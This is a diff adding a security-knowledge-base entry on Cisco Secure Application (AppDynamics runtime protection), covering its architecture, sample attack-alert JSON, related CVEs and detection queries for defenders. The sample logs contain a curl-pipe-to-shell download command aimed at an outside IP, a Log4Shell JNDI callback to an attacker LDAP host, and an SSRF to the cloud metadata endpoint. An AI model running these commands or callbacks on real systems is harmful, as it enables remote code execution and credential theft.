@@ -1,0 +1,329 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: appdynamics-secure-app
+name: Cisco Secure Application (AppDynamics)
+short: AppD SecApp
+aka:
+  - Splunk AppDynamics Secure Application
+  - Cisco Secure Application
+  - AppDynamics Application Security Monitoring
+  - Secure App (Argento)
+vendor: Cisco
+category: web
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - rasp
+  - runtime-security
+  - apm
+  - java
+  - log4j
+  - ssrf
+  - json
+  - webhook
+summary: Runtime application self-protection (RASP) built into the AppDynamics Java, .NET and Node.js APM agents. It watches what a running app actually does (processes it spawns, sockets it opens, files it touches, classes it deserialises) and raises attack events (RCE, SSRF, SQL, Log4Shell, deserialisation, malicious IP) tied to the application, tier, business transaction and the vulnerable library and CVE behind them.
+sourcetypes:
+  - st: appdynamics_security
+    desc: Secure Application attack alerts (SourceType secure_app_attacks) sent by HTTP alert to the Splunk Add-on for AppDynamics; one JSON document per attack with nested attackEvents
+facts:
+  First released: 2021 (as Cisco Secure Application, from the Argento acquisition)
+  Delivery model: SaaS service attached to the AppDynamics SaaS Controller; logic runs inside the APM agent
+  Supported agents: Java Agent, .NET Agent, Node.js Agent (plus an OpenTelemetry option)
+  Detection classes: RCE, SSRF, SQL injection, Log4Shell, Java deserialisation, malicious IP (in/out)
+  Runtime policies: Command execution (PROCESS), filesystem (FILE), network/socket (NETWORK), HTTP response headers, web transaction
+  Log transport: HTTP alert (webhook) from Secure Application → Splunk HEC / any HTTP endpoint; REST API for pull
+  Log format: JSON (one attack per document, attackEvents array, embedded stack traces)
+  Typical volume: Low — tens to hundreds of attack documents per day per application, but each can be 5–30 KB because of stack traces
+placement:
+  slots:
+    - internal
+    - cloud
+    - dmz
+  items:
+    - slot: dmz
+      title: Internet-facing web and API tiers
+      desc: The agent runs inside the JVM / CLR / Node process of public web apps, so it sees the request that reached code — after the WAF, after TLS termination — and the system call it triggered.
+    - slot: internal
+      title: Back-end services and middleware
+      desc: Order processing, payment and integration tiers that call LDAP, databases and other services. SSRF and deserialisation attacks often land here via a front-end hop.
+    - slot: cloud
+      title: Kubernetes and cloud workloads
+      desc: Agents in containers on EKS/AKS/GKE report to the AppDynamics SaaS Controller and the Secure Application service; the alert webhook leaves from the SaaS side, not from your network.
+howItWorks:
+  - title: Agent instrumentation
+    body: Secure Application is not a separate sensor. The existing AppDynamics APM agent instruments sensitive JDK/CLR/Node APIs (process creation, socket connect/resolve, file I/O, deserialisation, JNDI lookups, SQL execution) and checks each call against the policies it downloaded.
+  - title: Controller + Secure Application service
+    body: The agent registers through the AppDynamics Controller. The Secure Application service reads the application/tier/node model from the Controller, tells the agent whether security is enabled, pushes configuration and policies, and receives the security events the agent emits.
+  - title: Attacks and events
+    body: Related runtime events are grouped into an attack with an attackId, outcome (EXPLOITED, BLOCKED, ATTEMPTED), attack types and status (OPEN/CLOSED). Each event carries the event type (e.g. SOCKET_RESOLVE, PROCESS), the vulnerable method, the matched CVE and a stack trace that shows the exact code path.
+  - title: Runtime policies (detect or block)
+    body: Policies per type — PROCESS, FILE, NETWORK, HTTP_RESPONSE_HEADER, TRANSACTION — can be set to detect or block. In block mode the agent throws a security exception at the sensitive call, so the business transaction fails instead of the command running.
+  - title: Library vulnerabilities and risk scoring
+    body: The agent inventories loaded libraries and maps them to CVEs; the service enriches them with CVSS and Kenna risk signals (active internet breach, easily exploitable, malware exploitable). Attack events carry this vulnerabilityInfo, which lets you rank a hit on a known-exploited library above noise.
+  - title: Alerting to the SIEM
+    body: An HTTP alert (not email) posts attack JSON to Splunk via the Splunk Add-on for AppDynamics (sourcetype appdynamics_security), or to any webhook such as a Cribl HTTP source. Only attacks are sent this way; vulnerabilities and business risk stay in the UI and REST API.
+traffic:
+  handles:
+    - HTTP/HTTPS business transactions (after TLS termination)
+    - Outbound sockets and DNS resolution from the app (SSRF, C2)
+    - OS process creation (RCE, web shells)
+    - Filesystem reads and writes by the app
+    - Java/.NET object deserialisation
+    - JNDI / LDAP lookups (Log4Shell)
+    - SQL statements issued by the app
+    - Loaded third-party libraries (SCA)
+  flow:
+    - step: Request
+      desc: An HTTP request enters a business transaction in an instrumented app tier.
+    - step: Code path
+      desc: Application code (or a vulnerable library) reaches a sensitive API — socket connect, Runtime.exec, file open, readObject, JNDI lookup.
+    - step: Policy check
+      desc: The agent matches the call against downloaded runtime policies and attack signatures.
+    - step: Detect or block
+      desc: Detect mode records the event; block mode raises a security exception and the call never runs.
+    - step: Event upload
+      desc: The agent sends the event with stack trace, vulnerable method and CVE match to the Secure Application service.
+    - step: Correlate + enrich
+      desc: The service groups events into an attack, adds CVSS/Kenna data and tier/BT context.
+    - step: Alert
+      desc: An HTTP alert posts the attack JSON to Splunk HEC, Cribl or another webhook.
+logs:
+  - type: Attack alert (SSRF / RCE)
+    sourcetype: appdynamics_security
+    format: json
+    share: 70–90 %
+    avg: ~6 KB (up to 30 KB with full stack traces)
+    desc: One document per attack update. Top-level attack summary plus an attackEvents array; each event has event type, outcome, blocked flag, vulnerable method, matched CVE, detailJson for the sensitive call and the stack trace.
+    key:
+      - attackId
+      - attackOutcome
+      - attackTypes
+      - application
+      - tier
+      - attackEvents[0].eventType
+      - attackEvents[0].matchedCveName
+      - attackEvents[0].detailJson.socketOut
+    noise:
+      - attackEvents[0].stackTrace
+      - attackEvents[0].cveId
+      - attackEvents[0].keyInfo
+      - attackEventTrigger
+      - attackEvents[0].maliciousIpSourceOut
+    sample: '{"SourceType":"secure_app_attacks","attackId":"31820457","attackSource":"EXTERNAL","attackOutcome":"EXPLOITED","attackTypes":"{SSRF}","attackEventTrigger":"","application":"shop-prod","tier":"order-service","businessTransaction":"/api/checkout","attackStatus":"OPEN","attackLastDetected":"2026-11-12 09:41:07 +0000 UTC","attackEvents":[{"attackOutcome":"EXPLOITED","eventType":"SOCKET_RESOLVE","attackTypes":"SSRF","timestamp":"2026-11-12T09:41:07Z","applicationName":"shop-prod","tierName":"order-service","clientAddress":"203.0.113.77","serverAddress":"10.40.2.15","serverPort":8443,"webTransactionUrl":"https://shop.example.com/api/checkout","maliciousIpOut":"","maliciousIpSourceOut":"","detailJson":{"classname":"java.net.SocketPermission","ptype":"SOCKET","socketOut":"169.254.169.254","hostContext":"169.254.169.254","methodName":"sun.net.www.http.HttpClient.openServer","apiServerExternal":true,"apiServerInUrl":true},"blocked":false,"blockedReason":"","vulnerableMethod":"com.example.shop.PreviewController.fetchImage(PreviewController.java:88)","matchedCveName":"","keyInfo":"","cveId":"","jvmId":"order-service-7f9c-1","stackTrace":"java.lang.SecurityManager.checkConnect(SecurityManager.java:1051)\nsun.net.www.http.HttpClient.openServer(HttpClient.java:510)\ncom.example.shop.PreviewController.fetchImage(PreviewController.java:88)"}]}'
+  - type: Log4Shell / JNDI attack
+    sourcetype: appdynamics_security
+    format: json
+    share: 5–20 %
+    avg: ~5 KB
+    desc: JNDI lookup to an attacker-controlled LDAP/RMI server triggered by a logged string. Carries the matched CVE and Kenna/CVSS enrichment for the vulnerable library; outcome is BLOCKED when the NETWORK policy is in block mode.
+    key:
+      - attackId
+      - attackOutcome
+      - attackTypes
+      - attackEvents[0].blocked
+      - attackEvents[0].matchedCveName
+      - attackEvents[0].detailJson.socketOut
+      - attackEvents[0].vulnerabilityInfo.library
+      - attackEvents[0].vulnerabilityInfo.kennaActiveInternetBreach
+    noise:
+      - attackEvents[0].stackTrace
+      - attackEvents[0].vulnerabilityInfo.cveNvdUrl
+      - attackEvents[0].keyInfo
+    sample: '{"SourceType":"secure_app_attacks","attackId":"31820611","attackSource":"EXTERNAL","attackOutcome":"BLOCKED","attackTypes":"{LOG4J}","application":"hr-portal","tier":"hr-web","businessTransaction":"/login","attackStatus":"OPEN","attackLastDetected":"2026-11-12 10:02:55 +0000 UTC","attackEvents":[{"attackOutcome":"BLOCKED","eventType":"SOCKET_RESOLVE","attackTypes":"LOG4J","timestamp":"2026-11-12T10:02:55Z","applicationName":"hr-portal","tierName":"hr-web","clientAddress":"198.51.100.61","detailJson":{"classname":"java.net.SocketPermission","ptype":"SOCKET","socketOut":"ldap.attacker.example.org:1389","methodName":"com.sun.jndi.ldap.Connection.createSocket"},"blocked":true,"blockedReason":"NETWORK policy: block","vulnerableMethod":"org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)","matchedCveName":"CVE-2021-44228","keyInfo":"","vulnerabilityInfo":{"library":"log4j-core-2.14.1.jar","title":"Apache Log4j2 JNDI RCE","type":"RCE","cvssScore":10.0,"cvssSeverity":"CRITICAL","cveNvdUrl":"https://nvd.nist.gov/vuln/detail/CVE-2021-44228","kennaActiveInternetBreach":true,"kennaEasilyExploitable":true,"kennaScore":100},"stackTrace":"com.sun.jndi.ldap.Connection.createSocket(Connection.java:350)\norg.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)"}]}'
+  - type: Malicious IP / command execution
+    sourcetype: appdynamics_security
+    format: json
+    share: 5–15 %
+    avg: ~4 KB
+    desc: MALIP events (socket to or from a threat-intel listed address) and PROCESS events (the app spawned a shell). An app server spawning /bin/sh is the strongest web-shell / RCE signal the agent produces.
+    key:
+      - attackOutcome
+      - attackTypes
+      - tier
+      - attackEvents[0].eventType
+      - attackEvents[0].maliciousIpOut
+      - attackEventTrigger
+      - attackEvents[0].detailJson.ptype
+    noise:
+      - attackEvents[0].stackTrace
+      - attackEvents[0].keyInfo
+    sample: '{"SourceType":"secure_app_attacks","attackId":"31820733","attackSource":"EXTERNAL","attackOutcome":"EXPLOITED","attackTypes":"{RCE,MALIP}","attackEventTrigger":"/bin/sh -c curl -s http://198.51.100.200/x.sh | sh","application":"shop-prod","tier":"catalog-service","businessTransaction":"/admin/upload","attackStatus":"OPEN","attackLastDetected":"2026-11-12 11:15:32 +0000 UTC","attackEvents":[{"attackOutcome":"EXPLOITED","eventType":"PROCESS","attackTypes":"RCE","timestamp":"2026-11-12T11:15:30Z","tierName":"catalog-service","clientAddress":"203.0.113.140","detailJson":{"classname":"java.io.FilePermission","ptype":"PROCESS","methodName":"java.lang.ProcessBuilder.start"},"blocked":false,"vulnerableMethod":"org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:67)","matchedCveName":"CVE-2017-5638","maliciousIpOut":"198.51.100.200","maliciousIpSourceOut":"Talos","keyInfo":"","stackTrace":"java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)\njava.lang.Runtime.exec(Runtime.java:620)"}]}'
+cves:
+  - id: CVE-2021-34745
+    cvss: 7.8
+    year: 2021
+    kev: false
+    scope: device
+    title: AppDynamics .NET Agent for Windows — local privilege escalation to SYSTEM via the Coordinator service
+    affected: .NET Agent for Windows installed via MSI, releases earlier than 21.7
+    fixed: .NET Agent 21.7
+    detect: Not visible in Secure Application alerts (the agent itself is the target). Look for child processes of AppDynamics.Coordinator.exe in EDR/Sysmon and agent version < 21.7 in the Controller agent inventory.
+    avoid: Upgrade the .NET agent; restrict interactive logon on app servers; monitor the Coordinator service's child processes.
+  - id: CVE-2024-20345
+    cvss: 6.5
+    year: 2024
+    kev: false
+    scope: device
+    title: AppDynamics Controller file-upload path traversal (authenticated)
+    affected: AppDynamics Controller earlier than 23.4.0 (on-premises)
+    fixed: Controller 23.4.0
+    detect: Controller audit log uploads by unexpected users or with ../ in file names; the Controller is the trust anchor that pushes Secure Application policies to agents.
+    avoid: Upgrade on-prem Controllers; SaaS Controllers are patched by Cisco; keep the Controller UI off the internet and behind SSO.
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Apache Log4j2 JNDI lookup RCE (Log4Shell) — a native Secure Application attack type
+    affected: Log4j 2.0-beta9 through 2.15.0 (excluding 2.12.2, 2.12.3, 2.3.1) inside monitored Java apps
+    fixed: Log4j 2.17.1 (2.12.4 / 2.3.2 for older Java)
+    detect: attackTypes contains LOG4J; eventType SOCKET_RESOLVE to an LDAP/RMI host; matchedCveName=CVE-2021-44228; vulnerabilityInfo.library log4j-core-2.1x.
+    avoid: Upgrade log4j-core; set the NETWORK policy to block unknown outbound LDAP/RMI; egress-filter app tiers.
+  - id: CVE-2022-22965
+    cvss: 9.8
+    year: 2022
+    kev: true
+    scope: traffic
+    title: Spring Framework data-binding RCE (Spring4Shell) in monitored Java apps
+    affected: Spring Framework 5.3.0–5.3.17, 5.2.0–5.2.19 and older on JDK 9+ deployed as WAR on Tomcat
+    fixed: Spring Framework 5.3.18, 5.2.20
+    detect: FILE events writing a .jsp under the Tomcat webapps directory, followed by PROCESS from the same tier; matchedCveName=CVE-2022-22965.
+    avoid: Upgrade Spring; FILE policy to block writes under webapps/; PROCESS policy to block shell spawn from app servers.
+  - id: CVE-2017-5638
+    cvss: 9.8
+    year: 2017
+    kev: true
+    scope: traffic
+    title: Apache Struts 2 Jakarta Multipart parser OGNL RCE
+    affected: Struts 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1
+    fixed: Struts 2.3.32, 2.5.10.1
+    detect: attackTypes contains RCE; eventType PROCESS with vulnerableMethod in JakartaMultiPartRequest; Content-Type based payloads on upload BTs.
+    avoid: Upgrade Struts; block PROCESS in the runtime policy for app tiers that never need to spawn commands.
+detections:
+  - title: Exploited attack on a production tier
+    severity: critical
+    signals:
+      - attackOutcome=EXPLOITED
+      - attackStatus=OPEN
+      - any attack type
+    why: The agent saw the malicious call actually execute (not just attempted). This is post-WAF, in-code confirmation and should page.
+    kql: |-
+      dataset="appd_secapp" SourceType="secure_app_attacks" attackOutcome="EXPLOITED" attackStatus="OPEN"
+      | summarize attacks=dcount(attackId), first=min(_time) by application, tier, attackTypes
+    mitre:
+      - T1190
+  - title: Application server spawned a shell (RCE / web shell)
+    severity: critical
+    signals:
+      - attackTypes contains RCE
+      - detailJson.ptype=PROCESS
+      - attackEventTrigger contains sh / cmd.exe / powershell
+    why: Web and API tiers almost never need to start an OS shell; a spawned shell is the classic outcome of deserialisation, OGNL or template-injection RCE.
+    kql: |-
+      dataset="appd_secapp" attackTypes has "RCE"
+      | where tostring(attackEvents[0].detailJson.ptype) == "PROCESS"
+      | extend cmd=attackEventTrigger
+      | where cmd matches regex @"(/bin/(ba)?sh|cmd\.exe|powershell)"
+      | project _time, application, tier, cmd, attackOutcome
+    mitre:
+      - T1190
+      - T1059.004
+      - T1505.003
+  - title: SSRF to cloud metadata service
+    severity: high
+    signals:
+      - attackTypes contains SSRF
+      - socketOut = 169.254.169.254 or metadata.google.internal
+    why: SSRF to the instance metadata endpoint is how attackers steal cloud IAM credentials from a web tier (Capital One-style).
+    kql: |-
+      dataset="appd_secapp" attackTypes has "SSRF"
+      | extend dst=tostring(attackEvents[0].detailJson.socketOut)
+      | where dst has_any ("169.254.169.254","metadata.google.internal","fd00:ec2::254")
+      | summarize hits=count() by application, tier, dst, attackOutcome
+    mitre:
+      - T1190
+      - T1552.005
+  - title: Log4Shell / JNDI callback
+    severity: high
+    signals:
+      - attackTypes contains LOG4J
+      - outbound LDAP/RMI socket
+      - matchedCveName=CVE-2021-44228
+    why: Still widely scanned; a hit tells you exactly which app and library version is still vulnerable, and whether block mode stopped it.
+    kql: |-
+      dataset="appd_secapp" attackTypes has "LOG4J"
+      | summarize hits=count(), blocked=countif(attackOutcome=="BLOCKED") by application, tier, tostring(attackEvents[0].vulnerabilityInfo.library)
+    mitre:
+      - T1190
+      - T1059
+  - title: Outbound connection to a malicious IP
+    severity: high
+    signals:
+      - attackTypes contains MALIP
+      - maliciousIpOut not empty
+    why: An app tier talking to a known-bad address points to C2, payload download or data exfiltration from inside the process.
+    kql: |-
+      dataset="appd_secapp" attackTypes has "MALIP"
+      | extend bad_ip=tostring(attackEvents[0].maliciousIpOut)
+      | where isnotempty(bad_ip)
+      | summarize count() by application, tier, bad_ip
+    mitre:
+      - T1071.001
+      - T1105
+  - title: Exploited attack on a known-exploited library
+    severity: medium
+    signals:
+      - matchedCveName not empty
+      - vulnerabilityInfo.kennaActiveInternetBreach=true
+    why: Joins runtime proof with patch priority — the library is both reachable in your code and exploited in the wild. Feed it to the patch backlog with the stack trace as evidence.
+    kql: |-
+      dataset="appd_secapp" isnotempty(attackEvents[0].matchedCveName)
+      | where tostring(attackEvents[0].vulnerabilityInfo.kennaActiveInternetBreach) == "true"
+      | summarize count() by application, tostring(attackEvents[0].matchedCveName), tostring(attackEvents[0].vulnerabilityInfo.library)
+    mitre:
+      - T1190
+optimizations:
+  - title: Trim stack traces
+    saving: 40–70 %
+    fn: Eval
+    how: Stack traces are the bulk of every document. Keep the top 5 frames (where the sensitive call and vulnerable method are) for the SIEM and send the full document to Lake.
+    expr: "after Unroll: stackTrace = stackTrace.split('\\n').slice(0,5).join('\\n')"
+  - title: Unroll attackEvents
+    saving: Search cost, not bytes
+    fn: Unroll → Flatten
+    how: One attack document can carry many events. Unroll attackEvents into one event per runtime event so each has its own _time, eventType and socket/command, then flatten detailJson.
+    expr: unroll attackEvents → flatten prefix attackEvent_
+  - title: Drop empty enrichment fields
+    saving: 10–20 %
+    fn: Parser → Serialize
+    how: maliciousIpOut, maliciousIpSourceOut, keyInfo, cveId and attackEventTrigger are empty on most events; remove empty strings and the internal cveId UUID.
+    expr: "remove: cveId, keyInfo, attackEventTrigger; drop empty"
+  - title: Suppress repeat updates of the same open attack
+    saving: 20–50 %
+    fn: Suppress
+    how: An OPEN attack is re-sent as new events attach. Keep one per attackId per 15 minutes unless the outcome changes.
+    expr: "key: `${attackId}:${attackOutcome}`  allow 1 / 900s"
+references:
+  - title: Integrate Secure Application with Splunk (AppDynamics SaaS docs)
+    url: https://help.splunk.com/en/appdynamics-saas/application-security-monitoring/26.7.0/application-security-monitoring/integrate-secure-application-with-splunk
+  - title: Secure Application architecture
+    url: https://help.splunk.com/en/appdynamics-saas/application-security-monitoring/26.7.0/application-security-monitoring/secure-application-architecture
+  - title: Monitor attacks — attack types and outcomes
+    url: https://help.splunk.com/en/appdynamics-saas/application-security-monitoring/26.7.0/application-security-monitoring/monitor-application-security-using-secure-application/monitor-attacks
+  - title: Splunk data source — AppDynamics Secure Application Alert (field list)
+    url: https://research.splunk.com/sources/5c963eb0-010e-4386-875f-5134879f14a7/
+  - title: Cisco advisory — AppDynamics Controller path traversal (CVE-2024-20345)
+    url: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-appd-traversal-m7N8mZpF
+  - title: NVD — CVE-2021-34745 (AppDynamics .NET Agent)
+    url: https://nvd.nist.gov/vuln/detail/CVE-2021-34745
+  - title: Apache Log4j security vulnerabilities
+    url: https://logging.apache.org/security.html
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - log4j
+  - f5-awaf
+  - imperva-waf
+  - cloudflare-waf
+  - cisco-ai-defense
